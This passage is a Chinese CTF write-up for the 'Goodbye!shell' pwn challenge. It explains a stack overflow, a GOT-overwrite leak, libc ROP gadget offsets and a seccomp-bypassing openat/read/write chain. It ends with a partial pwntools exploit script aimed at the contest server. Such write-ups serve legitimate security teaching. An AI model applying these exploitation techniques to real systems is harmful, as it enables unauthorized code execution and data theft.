---
title: 2026 年“羊城杯”网络安全大赛初赛-简单pwn-RE
url: https://mp.weixin.qq.com/s/iYMM1gYBw-ZMAsj3nqkn-g
source: Doonsec's feed
date: 2026-10-24
fetch_date: 2026-10-25T07:06:35.368748
---

# 2026 年“羊城杯”网络安全大赛初赛-简单pwn-RE

# 2026 年“羊城杯”网络安全大赛初赛-简单pwn-RE

原创

opis
opis

玄网安全

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/hiaeZ5goDm5fSzJka7icibQxIWsXwpadqLWNVCzfm77e7cAkjGlEibiaVczgMaovzHqD7aKbibGK9Q9J7rWGqxRELWibDEAs2vt1zYCx2WeIdlticH8/640?wx_fmt=webp&from=appmsg)

# Goodbye!shell

> 核心思路：`read` 只溢出保存的 `rbp` 和返回地址，用同一段 `read; write("Goodbye!s"); leave; ret` 把数据铺到可写页，再借 `seccomp_load` 的调用泄漏 `write`，最后在该页上做 `openat/read/write`。

## 1. 题目说明

第 5 行

题目提示是「进来道个别吧，只是这一次，shell 可能不会回应你了。」附件为未剥离的 `pwn`、`libc.so.6`、`ld-linux-x86-64.so.2` 和 `libseccomp.so.2`。本次实例：

* 连接：`1.14.76.59:21909`（平台映射 `nc/9999`）
* `pwn` SHA256：`c9ea48c64357bb5ec0b08084701d49e3f8513e1befad7560671d90fa0261ca8e`
* `libc.so.6` SHA256：`b2cf6c33b74d2f22543b7a469a75b538911e690f769d0b238843a49465b83793`

`pwn` 是 x86-64 ET\_EXEC，加载基址 `0x400000`，解释器为 `/lib64/ld-linux-x86-64.so.2`，由 Ubuntu gcc 11.4.0 编译。`libc.so.6` 的版本字符串是 `Ubuntu GLIBC 2.35-0ubuntu3.15`。程序没有源码，下面的控制流都来自 `objdump`。

`main` 先调用 `sandbox`，再写出 19 字节的 `Give me your name:`，然后进入 `vuln`：

```
4011c2:  mov    edi,0x7fff0000
4011c7:  call   seccomp_init@plt
4011d9:  mov    edx,0x3b          ; execve
4011de:  mov    esi,0x0           ; SCMP_ACT_KILL
4011eb:  call   seccomp_rule_add@plt
4011f9:  mov    edx,0x142         ; execveat
4011fe:  mov    esi,0x0
40120b:  call   seccomp_rule_add@plt
401210:  mov    rax,QWORD PTR [rbp-0x8]
401214:  mov    rdi,rax
401217:  call   seccomp_load@plt
40121d:  leave
40121e:  ret

401227:  sub    rsp,0x20
40122b:  lea    rax,[rbp-0x20]
40122f:  mov    edx,0x30
401237:  mov    edi,0x0
40123c:  call   read@plt
401241:  mov    edx,0x9
401246:  lea    rax,[rip+0xdb7]   ; "Goodbye!s"
40124d:  mov    rsi,rax
401250:  mov    edi,0x1
401255:  call   write@plt
40125b:  leave
40125c:  ret
```

`0x7fff0000` 是 `SCMP_ACT_ALLOW`，`esi = 0` 是 `SCMP_ACT_KILL`。沙箱默认放行，只杀死 `execve`（59）和 `execveat`（322）。`openat`、`read`、`write`、`exit` 不受影响，所以目标是读出工作目录里的 `flag`，而不是拿 shell。

## 2. 解题思路

保护可以从程序头直接读出来：ET\_EXEC，没有 PIE；`GNU_STACK` 只有 `RW`，栈不可执行；`vuln` 里没有 canary；`GNU_RELRO` 覆盖 `0x403e00` 起的 `0x200` 字节，`.got.plt` 在 `0x404000`，是 Partial RELRO。函数入口都有 `endbr64`，间接调用的落点必须带 `endbr64` 才经得起 IBT。远程最终能靠普通 `ret` 链跑完，说明这个实例没有用 SHSTK 挡住返回地址。

溢出只有 `0x10` 字节。`vuln` 在 `rbp-0x20` 放了 `0x20` 字节缓冲区，却 `read` 了 `0x30` 字节，多出来的正好是保存的 `rbp` 和返回地址。二进制里没有 `pop rdi`、`pop rsi`、`pop rdx`、`pop rax` 和 `syscall`，一次返回做不了系统调用。

可写页补上了这块空间。唯一的 RW LOAD 虚拟地址 `0x403e00`、文件大小 `0x250`、内存大小 `0x258`。加载器按页映射后，`0x403e00–0x404000` 被 RELRO 改成只读，`0x404000–0x405000` 仍可写。文件大小只到 `0x404050`，BSS 只清到 `0x404058`，这一页余下的字节仍是文件尾（`.symtab`、`.strtab` 等节名）。`0x404058` 之后都可以当草稿纸，只要别盖掉还要用的 `write@GOT`。

利用分两段：

1. 反复从 `0x40122b` 进入，每次向指定地址写 `0x30` 字节，把路径、跳板和泄漏帧铺到这一页。
2. 把 `seccomp_load@GOT` 改成 `endbr64; ret`，走到 `0x401210`，让 `rax` 变成 `write@GOT` 的地址，再用 `0x40124d` 把 GOT 上的 8 字节地址打出来。加上 libc 里的 `syscall; ret`，执行 `openat/read/write/exit`。

## 3. 解题过程

### 3.1 把 0x30 字节读做成写入原语

`0x40122b` 到 `leave; ret` 的行为只由当前 `rbp` 决定：

* `read(0, rbp-0x20, 0x30)` 写入 32 字节数据和下一帧的 `rbp`、`rip`
* 随后固定 `write(1, "Goodbye!s", 9)`
* `leave; ret` 切到刚才写入的下一帧

因此第一发从真实栈溢出时，只要把保存的 `rbp` 指到目标地址加 `0x20`，返回地址设为 `0x40122b`，后面每一次输入都是同一格式。`read` 和 `write` 的 glibc 包装在进入内核前不改第三个参数，内核也保留 `rdx`，所以每轮问候之后 `rdx` 仍是 9。这个值后面用来控制泄漏长度。

一轮写入会覆盖 `[rbp-0x20, rbp+0x10)`。上一帧还没返回时，它的返回槽在 `prev+8`，不能落进这一窗口，所以连续两个读帧至少错开 `0x30` 字节。脚本里用 `check_gap` 检查这件事。

懒绑定也会占栈。泄漏之后第一条真正的链还要经过 `read` 的解析器，`_dl_runtime_resolve_xsave` 的栈帧远大于普通 `read`。路径、跳板和 ROP 链放在 `0x404080–0x404420`，解析器使用的高地址帧放在 `0x404c00` 以上，两边不重叠。

这一页上的分工：

| 地址 | 内容 |
| --- | --- |
| `0x404028` | `write@GOT` ，泄漏前不能改 |
| `0x404030` | `seccomp_load@GOT` ，改成 `0x401100` |
| `0x404038` | `read@GOT` ，改成 PLT 桩 `0x401070`，保证后续还能解析 `read` |
| `0x404080` | 4 块跳板，每块指向下一段 ROP |
| `0x404180` | 字符串 `flag\x00` |
| `0x404300` | 9 段、每段 `0x20` 字节的最终系统调用链 |
| `0x404600` | 读 flag 的缓冲区 |
| `0x404c00` 起 | 间隔 `0x40` 的中转帧 |
| `0x404e00/0x404e40/0x404e80` | 进入泄漏原语的三帧 |

跳板本身也得用这个 0x30 字节原语写进去。中转帧先落到高地址，再回头写低地址的跳板，避免正在执行的返回槽被下一次 `read` 盖掉。泄漏前共 13 次 `read`：1 次初始溢出、3 次中转、1 次路径、4 次跳板、3 次泄漏帧。

### 3.2 用 seccomp\_load 泄漏 write

二进制里没有方便的寄存器 gadget，泄漏借的是 `sandbox` 尾部现成的指令。先在 `rbp = 0x404050` 的那一次写入里把 GOT 改成：

* `0x404030 = 0x401100`，即 `_dl_relocate_static_pie` 的 `endbr64; ret`
* `0x404038 = 0x401070`，即 `read` 的 `.plt` 桩（`endbr64; push 4; jmp resolver`）

`0x401100` 不能换成裸 `ret`。`0x401217` 的 `call seccomp_load@plt` 最终是间接跳转，IBT 要求目标以 `endbr64` 开头。

随后 `leave` 到 `0x404e00`。这一帧再 `leave; ret` 到 `0x401210`，此时 `rbp = 0x404e40`，而 `[rbp-8]` 事先写成了 `0x404028`：

```
401210:  mov    rax,QWORD PTR [rbp-0x8]   ; rax = 0x404028
401214:  mov    rdi,rax
401217:  call   seccomp_load@plt          ; GOT 已是 endbr64; ret，rax 不变
40121d:  leave                            ; 下一帧 rbp = 0x404e80，rip = 0x40124d
40124d:  mov    rsi,rax                   ; rsi = write@GOT
401250:  mov    edi,0x1
401255:  call   write@plt                  ; rdx 仍是 9
```

于是输出是 `write(1, 0x404028, 9)`。前 8 字节是 `write` 的真实地址，第 9 字节是旁边 `seccomp_load@GOT` 的低字节，丢掉即可。

欢迎语 19 字节，13 轮各打印 9 字节 `Goodbye!s`，再加 9 字节泄漏，一共 145 字节。本次连接解出：

* `write = 0x7f07908899c0`
* libc 基址 = `write - 0x1149c0 = 0x7f0790775000`

`0x1149c0` 是这份 libc 里 `write` 的文件偏移，脚本启动时用 `libc.sym["write"]` 读取。

### 3.3 在可写页上执行 openat/read/write

libc 2.35 里用到的文件偏移：

| gadget | 偏移 | 字节 |
| --- | --- | --- |
| `pop rdi; ret` | `0x2a3e5` | `5f c3` |
| `pop rsi; ret` | `0x2be51` | `5e c3` |
| `pop rdx; pop rbx; ret` | `0x90469` | `5a 5b c3` |
| `pop rax; ret` | `0x45eb0` | `58 c3` |
| `syscall; ret` | `0x912d6` | `0f 05 c3` |
| `xchg eax, edi; ret` | `0x15bfd5` | `97 c3` |

链的第一项是占位用的 saved `rbp`。后面依次是：

```
openat(AT_FDCWD, 0x404180, O_RDONLY)    ; rax = 257
xchg eax, edi                           ; 32 位写 rdi，高 32 位清零，rdi = fd
read(fd, 0x404600, 0x80)                ; rax = 0
write(1, 0x404600, 0x80)                ; rax = 1
exit(0)                                 ; rax = 60
```

`AT_FDCWD` 是 `-100`，高 32 位全是 1。这里必须用 32 位的 `xchg eax, edi`：32 位结果写回寄存器时会把 `rdi` 的高位清掉，fd 才是合法的小整数。若换成 64 位交换，`rdi` 会变成 `0xffffffff00000000 | fd`，`read` 会失败。

整条链 35 个 qword，280 字节，补齐到 9 个 `0x20` 字节块。每一块仍用 `0x40122b` 写入；块与块之间通过 `0x404080` 的跳板做 `leave; ret`。9 次写入会再打印 9 个 `Goodbye!s`，然后系统调用把 flag 写到标准输出。

`read` 长度固定 `0x80`，flag 没有这么长，也不会把缓冲区剩下的字节清零。所以 flag 后面紧跟着这一页里原有的节名字符串，那些字节不属于 flag。

## 4. 完整解题脚本

把附件里的 `pwn` 和 `libc.so.6` 放在当前目录。脚本用它们核对 gadget，并向 `1.14.76.59:21909` 发送两段 payload。

```
#!/usr/bin/env python3
"""Goodbye!shell

seccomp kills execve/execveat only. The bug is a 0x10-byte overflow
(saved rbp + rip) in read(0, buf, 0x30), so the chain is staged through
that same gadget and pivoted onto a BSS ROP of openat/read/write.
"""
from pwn import *

context.arch = "amd64"
context.log_level = "info"

elf = ELF("./pwn", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

READ = 0x40122B
LEAVE = 0x40121D
LOAD = 0x401210
W9 = 0x40124D
ENDBR_RET = 0x401100
PLT_READ = 0x401070

assert elf.read(ENDBR_RET, 5) == b"\xf3\x0f\x1e\xfa\xc3"

POP_RDI = 0x2A3E5
POP_RSI = 0x2BE51
POP_RDX_RBX = 0x90469
POP_RAX = 0x45EB0
SYSCALL = 0x912D6
XCHG_EAX_EDI = 0x15BFD5
WRITE_OFF = libc.sym["write"]

assert libc.read(POP_RDI, 2) == b"\x5f\xc3"
assert libc.read(POP_RSI, 2) == b"\x5e\xc3"
assert libc.read(POP_RDX_RBX, 3) == b"\x5a\x5b\xc3"
assert libc.read(POP_RAX, 2) == b"\x58\xc3"
assert libc.read(SYSCALL, 3) == b"\x0f\x05\xc3"
assert libc.read(XCHG_EAX_EDI, 2) == b"\x97\xc3"

PATH = 0x404180
BUF = 0x404600
CHAIN = 0x404300
TBASE = 0x404080          # below the resolver scratch
L = 0x404E40              # LOAD frame
W = 0x404E80              # frame used by the 9-byte write gadget
HIGH2 = 0x404E00          # leave target that enters LOAD

def check_gap(prev, cur, what):
    if prev is None:
        return
    slot = prev + 8
    lo, hi = cur - 0x20, cur + 0x10
    if lo <= slot < hi:
        raise SystemExit(f"overlap {what}: prev={prev:#x} cur={cur:#x}")

def build_chain(base):
    def g(off):
        return base + off

    q = [
        0,
        g(POP_RDI), 0xFFFFFFFFFFFFFF9C,
        g(POP_RSI), PATH,
        g(POP_RDX_RBX), 0, 0,
        g(P...